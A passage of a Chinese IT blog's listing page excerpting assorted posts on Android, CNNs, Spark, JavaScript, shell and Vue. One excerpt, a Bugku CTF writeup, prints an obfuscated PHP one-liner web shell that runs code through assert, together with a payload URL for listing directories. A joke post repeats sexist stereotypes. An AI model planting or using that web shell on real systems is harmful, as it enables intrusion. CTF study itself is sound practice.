14:38:49.641 5624-5624/com.moreunion.zhenghao W/System.err: at okhttp3.internal.AndroidPlatform.connectSocket(AndroidPlatform.java:55) 02-28 14:38:49.641 5624-5624/com.moreunion.zhenghao W/System.err: at okhttp3.internal.io.RealConnection.connectSocket(RealConnection.java:185) 02-28 14:38:49.641 5624-5624/com.moreunion.zhenghao W/System.err: at okhttp3.internal.io.RealConnection.buildConnection(RealConnection.java:170) 02-28 14:38:49.641 5624-5624/com.moreunion.zhenghao W/System.err: at okhttp3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/068f08f32c2014fae1d1da75b442439a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30dadebe24d951ebcbf217d95c56d554/" rel="bookmark">
			不使用框架实现卷积神经网络(Python)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不使用框架实现卷积神经网络(Python) 之前为了对卷积神经网络有更深入的了解，结合别人的成果和自己的思考，在仅使用numpy和cv2的前提下，实现了深度卷积神经网络，并使用mnist数据集进行了训练和测试。不过速度真的非常慢，代码：https://github.com/WepLeo/cnn_without_frame。
主要参考了这两个： https://github.com/hsmyy/zhihuzhuanlan刘建平的博客:http://www.cnblogs.com/pinard/p/6494810.html 自己遇到的问题 自己之前卡住的地方，有俩：一个是卷积层的反向传播，这个之前看博客推公式搞了好久；另一个是参数初始化，之前使用框架的时候没用心，导致卡了好久。怪自己之前考虑不深入。
卷积层的反向传播 这一块，看好多人都是根据前后两层的关系（conv-conv, conv-pooling…），分不同情况讨论，一直不是很理解（我觉得每一层都是独立的啊，为啥还要分情况讨论，希望有人明示），只有刘建平的博客是将每一层独立开的，才看明白。卷积层的反向传播中，在计算梯度时，就是在找前向传播中，两两相乘的另一半，以及与该乘积相关的那次求和的结果。我们可以记住对应的另一半以及求和结果，也可以通过翻转的方式找到，但是要注意padding和步长的影响，下面是input_size=(6,6), kernel_size=(3,3),padding=1,步长为1时的正反向传播过程：
正向传播 反向传播 初始化 之前一直都是使用框架，参数的初始化都是默认的，就没在意，结果就想当然的使用正太分布初始化了，结果训练的时候死活都不收敛，而且loss总是NAN，打印每一层的输出，发现后面几层绝对值都特别大，最后才发现是参数初始化的值数量级大了的原因，使用glorot_uniform后分分钟就看到效果了，最后精度为98%左右。
总结 写的非常粗糙，欢迎交流。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14339b3a0190c5eb0754ecb8ebe128e4/" rel="bookmark">
			【bugku】过狗一句话 writeup
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 过狗一句话 题目提示里的php代码拿下来
&lt;?php $poc = "a#s#s#e#r#t"; $poc_1 = explode("#", $poc); $poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5]; $poc_2($_GET['s']) ?&gt; 12345 用assert执行任意代码 这就很自由了 payload：http://120.24.86.145:8010/?s=print_r(scandir('./')); 扫描目录 然后读取flag.txt 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/857880f25392abdce40876892aedbbbe/" rel="bookmark">
			程序员千万别找太漂亮的女生做女朋友
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		程序员千万别找太漂亮的女生做女朋友
美女每天弄头发
买鞋子买衣服不思进取
美女天生就有种优越感
程序员都绕着她转
她们不懂尊重男朋友
还容易出轨！
程序员要找女朋友
只要打扮整洁
干干净净
长得一般就好
美女
还是都留给我吧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e6f8dc266adf57bf24de117181b0fd5/" rel="bookmark">
			Spark访问安全HBase异常No valid credentials provided
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原始文章链接：https://alphablacktan.github.io/bigdata/2018/08/12/Spark访问安全HBase异常No-valid-credentials-provided/
问题现象 在Spark（cluster模式）上访问安全HBase抛出如下异常：
... DEBUG | Connecting to linux18/10.75.202.18:21310 | org.apache.hadoop.hbase.ipc.RpcClientImpl$Connection.setupIOStreams(RpcClientImpl.java:713) INFO | RPC Server Kerberos principal name for service=MasterService is hbase/hadoop.hadoop.com@HADOOP.COM | org.apache.hadoop.hbase.ipc.RpcClientImpl$Connection.processPreambleResponse(RpcClientImpl.java:817) DEBUG | PrivilegedAction as:alphatan (auth:SIMPLE) from:org.apache.hadoop.hbase.ipc.RpcClientImpl$Connection.setupIOStreams(RpcClientImpl.java:741) | org.apache.hadoop.security.UserGroupInformation.logPrivilegedAction(UserGroupInformation.java:1805) DEBUG | Creating SASL GSSAPI client. Server's Kerberos principal name is hbase/hadoop.hadoop.com@HADOOP.COM | org.apache.hadoop.hbase.security.HBaseSaslRpcClient.&lt;init&gt;(HBaseSaslRpcClient.java:103) DEBUG | PrivilegedActionException as:alphatan (auth:SIMPLE) cause:javax.security.sasl.SaslException: GSS initiate failed [Caused by GSSException: No valid credentials provided (Mechanism level: Failed to find any Kerberos tgt)] | org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e6f8dc266adf57bf24de117181b0fd5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f44cf4e616ff10d66c28a82e596a635/" rel="bookmark">
			Spark使用小窍门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Spark设置日志级别 在Spark Driver实现中，初始化context实例之后，可以通过setLogLevel()方法设置日志级别。
... JavaSparkContext context = new JavaSparkContext(conf); context.setLogLevel("DEBUG"); ... 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d815f61a28d3e9c453c2efc700d6dc04/" rel="bookmark">
			javascript history对象详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前面的话
history对象保存着用户上网的历史记录，从窗口被打开的那一刻算起。由于安全方面的考虑，开发人员无法得到用户浏览器的URL，但借由用户访问过的页面列表，可以在不知道实际URL的情况下实现后退和前进。本文将详细介绍BOM中的history对象
length
history.length属性保存着历史记录的URL数量。初始时，该值为1。如果当前窗口先后访问了三个网址，history.length属性等于3
由于IE10+浏览器在初始时返回2，存在兼容性问题，所以该值并不常用
? 1 2 history.length // 初始时，该值为1 history.length // 访问三个网址后，该值为3 跳转方法
history对象提供了一系列方法，允许在浏览历史之间移动，包括go()、back()和forward()
【go()】
使用go()方法可以在用户的历史记录中任意跳转。这个方法接收一个参数，表示向后或向前跳转的页面数的一个整数值。负数表示向后跳转(类似于后退按钮)，正数表示向前跳转(类似于前进按钮)
? 1 2 3 4 5 6 //后退一页 history.go(-1) //前进一页 history.go(1); //前进两页 history.go(2); go()方法无参数时，相当于history.go(0)，可以刷新当前页面
? 1 2 3 4 //刷新当前页面 history.go(); //刷新当前页面 history.go(0); 【back()】
back()方法用于模仿浏览器的后退按钮，相当于history.go(-1)
【forward()】
forward()方法用于模仿浏览器的前进按钮，相当于history.go(1)
? 1 2 3 4 //后退一页 history.back() //前进一页 history.forward() 如果移动的位置超出了访问历史的边界，以上三个方法并不报错，而是静默失败
[注意]使用历史记录时，页面通常从浏览器缓存之中加载，而不是重新要求服务器发送新的网页
增改记录
HTML5为history对象添加了两个新方法，history.pushState()和history.replaceState()，用来在浏览历史中添加和修改记录。state属性用来保存记录对象，而popstate事件用来监听history对象的变化
[注意]IE9-浏览器不支持
【pushState()】
history.pushState()方法向浏览器历史添加了一个状态。pushState()方法带有三个参数：一个状态对象、一个标题(现在被忽略了)以及一个可选的URL地址
history.pushState(state, title, url);
state object —— 状态对象是一个由pushState()方法创建的、与历史纪录相关的javascript对象。当用户定向到一个新的状态时，会触发popstate事件。事件的state属性包含了历史纪录的state对象。如果不需要这个对象，此处可以填null
title —— 新页面的标题，但是所有浏览器目前都忽略这个值，因此这里可以填null
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d815f61a28d3e9c453c2efc700d6dc04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/787354ad490f9943cd4210fd3a26907c/" rel="bookmark">
			关于shell脚本的基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Q:1 Shell脚本是什么、它是必需的吗? 答:一个Shell脚本是一个文本文件，包含一个或多个命令。作为系统管理员，我们经常需要使用多个命令来完成一项任务，我们可以添加这些所有命令在一个文本文件(Shell脚本)来完成这些日常工作任务。 Q:2 什么是默认登录shell，如何改变指定用户的登录shell 答:在Linux操作系统，“/bin/bash”是默认登录shell，是在创建用户时分配的。使用chsh命令可以改变默认的shell。示例如下所示: # chsh &lt;用户名&gt; -s &lt;新shell&gt; # chsh linuxtechi -s /bin/sh Q:3 可以在shell脚本中使用哪些类型的变量? 答：在shell脚本，我们可以使用两种类型的变量： · 系统定义变量 · 用户定义变量 系统变量是由系统系统自己创建的。这些变量通常由大写字母组成，可以通过“set”命令查看。 用户变量由系统用户来生成和定义，变量的值可以通过命令“echo $&lt;变量名&gt;”查看。 Q:4 如何将标准输出和错误输出同时重定向到同一位置? 答：这里有两个方法来实现： 方法一： 2&gt;&amp;1 (如# ls /usr/share/doc &gt; out.txt 2&gt;&amp;1 ) 方法二： &amp;&gt; (如# ls /usr/share/doc &amp;&gt; out.txt ) Q:5 shell脚本中“if”语法如何嵌套? 答：基础语法如下： if [ 条件 ] then 命令1 命令2 ….. else if [ 条件 ] then 命令1 命令2 …. else 命令1 命令2 ….
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/787354ad490f9943cd4210fd3a26907c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d45c53f24b4ef41d19910bd0d481a999/" rel="bookmark">
			RedHat 7 安装HTTPD
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.查看操作系统版本 [root@aws srclib]# cat /etc/redhat-release Red Hat Enterprise Linux Server release 7.4 (Maipo) 2.首先安装apr,本例子是1.6.3版本 wget http://mirrors.cnnic.cn/apache/apr/apr-1.6.3.tar.gz 下载之后就是解压 tar -xzvf apr-1.6.3.tar.gz 进入apr目录，执行configure命令，该命令本例就一个参数 ，设置安装目录 cd /usr/local/src/apr-1.6.3
./configure --prefix=/usr/local/apr 配置好之后，执行make和make install make &amp;&amp; make install 3.安装 apr-util ，本例的版本是1.6.1 wget http://mirrors.cnnic.cn/apache/apr/apr-util-1.6.1.tar.bz2 在解压的时候有可能遇到报错： [root@aws src]# tar -jxvf apr-util-1.6.1.tar.bz2
tar (child): bzip2: Cannot exec: No such file or directory
tar (child): Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error is not recoverable: exiting now 解决的办法是： yum -y install bzip2 接下来和安装apr一样，先运行configure命令 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d45c53f24b4ef41d19910bd0d481a999/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f7ffd8ff2960ffe4a7995fc6650767e/" rel="bookmark">
			vue element-ui的$notify注意点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我的初衷是把element-ui的$notify通知封装成一个组件，登录成功后调用获取低库存接口，如果获取接口的列表当中库存大于0，则显示这个通知，并且在文本当中提供点击事件。
因此，首先想到的就是使用dangerouslyUseHTMLString属性，可以插入html字符串
export default { methods: { open12() { this.$notify({ title: 'HTML 片段', dangerouslyUseHTMLString: true, message: '&lt;strong&gt;这是 &lt;i id="show"&gt;HTML&lt;/i&gt; 片段&lt;/strong&gt;' }); } } } 但是，message里面的html字符串其实是脱离了vue，例如不能用@click方法绑定事件，因此，应该用js的操作dom来绑定。
首先，我想到的是在该组件的mounted方法里面获取
document.querySelector('#show'); 但是这样获取到的是null，为什么呢？
mounted的时候是该组件模板里面的dom挂载完毕，然而我这个组件里面并没有模板，只在方法里使用了this.$notify，挂载完后这个notify并不在app里面，
role=“alert”就是该通知框，因此我们不能把它当做普通组件操作。而且，它的挂载时机有可能在该组件的mounted之后，就是mouted方法时只是该组件挂载了，但是里面的这个motify可能还没有，因此就是null。
如果要在里面添加js方法如绑定事件，应该要在html里面添加监听，但是要掌握好时机。
我这里还是不使用notify了，因为notify应该是偏向于文本展示的通知类，我这里使用notify可能就会有点不妥。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/254/">«</a>
	<span class="pagination__item pagination__item--current">255/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/256/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>